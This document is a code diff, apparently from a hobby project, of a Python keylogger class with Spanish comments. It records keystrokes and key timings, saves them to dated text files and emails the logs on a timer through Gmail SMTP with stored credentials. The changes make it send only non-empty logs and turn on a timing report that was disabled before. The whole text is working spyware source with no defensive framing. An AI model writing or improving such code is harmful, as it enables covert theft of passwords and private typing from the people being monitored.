@@ -10,7 +10,7 @@ import report
 import os
 import sys
 import fileinput
-import timing
+
 
 
 
@@ -33,7 +33,9 @@ class Keylogger:
         self.interval = time_interval
         self.email = email
         self.password = password
-        
+
+
+
     #uniendo los valores
     def append_to_log(self,string):
         self.log=self.log + string
@@ -57,7 +59,8 @@ class Keylogger:
         #print(self.log) #impresion en pantalla 
         #self.send_mail(self.email, self.password, self.log) #envio de los datos capturados sin el txt
         self.crearTXT(self.log)
-        self.sendmailwithtxt(self.email, self.password)
+        if len(self.log) != 0:
+            self.sendmailwithtxt(self.email, self.password)
         self.log=""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
@@ -118,12 +121,12 @@ class Keylogger:
         archivo = open(self.m,"a")
         archivo.write(cadenita)
         archivo.close()
-        """ archivo = open("reporte_timing.txt","r")
+        archivo = open("reporte_timing.txt","r")
         cad = archivo.read()
         archivo.close()
         archivo = open(self.m, "a")
         archivo.write('***************************Reporte Time Key***************************''\n'+cad+'\n')
-        archivo.close() """
+        archivo.close()
 
     #inicia el proceso
     def start(self ):
@@ -145,9 +148,11 @@ class Keylogger:
         smtp = smtplib.SMTP("smtp.gmail.com", 587)
         smtp.starttls()
         smtp.login(email, password)
-        
         smtp.sendmail(email, email, mensaje.as_string())
         smtp.quit()
+        archivo = open("reporte_timing.txt","w")
+        archivo.close()
+        self.m = "keylogger_fecha_{}.txt".format(self.z.strftime("%d-%m-%Y_%H-%M-%S"))
 
     #timing
     def pressRecord(self,rt):
